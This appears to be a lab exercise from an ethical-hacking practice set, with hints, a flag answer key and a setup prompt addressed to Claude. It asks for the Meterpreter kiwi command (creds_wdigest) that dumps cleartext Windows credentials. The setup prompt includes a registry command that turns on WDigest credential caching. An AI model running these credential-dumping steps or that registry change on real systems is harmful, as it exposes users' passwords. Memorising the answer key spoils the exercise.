# Q052 — Mimikatz via Meterpreter

| Field | Value |
|---|---|
| **Target** | `192.168.52.129` / `192.168.52.130` |
| **Domain** | 05 — System Hacking |
| **Difficulty** | 🔴 Hard |
| **Tools** | `metasploit (meterpreter+kiwi)` |
| **Time budget** | 15–25 min |

---

## 📝 Question

After SYSTEM on Win7, load kiwi and run `creds_all`. Report command used to dump cleartext WDigest.

---

## 🎯 Flag Format

```
cmd=<mimikatz-cmd>
```

Example: `cmd=creds_wdigest`

**⚠️ Format strict hai** — lowercase, no spaces around `=`, semicolon separator where shown.

---

## 💡 Hints

<details>
<summary>Hint 1 (click)</summary>

`meterpreter > load kiwi` then `creds_wdigest`.
</details>

<details>
<summary>Hint 2</summary>

WDigest may be disabled on patched Win7.
</details>

---

## ✅ Solution

<details>
<summary>Show solution</summary>

```bash
load kiwi
creds_wdigest
```

Dumps any cached cleartext passwords.

**Answer:** `cmd=creds_wdigest`

📖 Ref: [tools/mimikatz.md](../../tools/mimikatz.md)
</details>

---

## 🤖 Claude Setup Prompt (for Claude-on-your-PC)

```
Pre-requisites for Q052:
1. Requires existing SYSTEM Meterpreter session on Win7 (re-establish via Q042 if needed).
2. On Win7, ensure a user is actually logged in interactively — WDigest only caches credentials of logged-on users.
3. Optional: enable WDigest on Win7 (reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f) then lock+unlock to repopulate cache.

Report back: "Lab ready for Q052 — SYSTEM meterpreter on Win7 with WDigest cache populated".
```
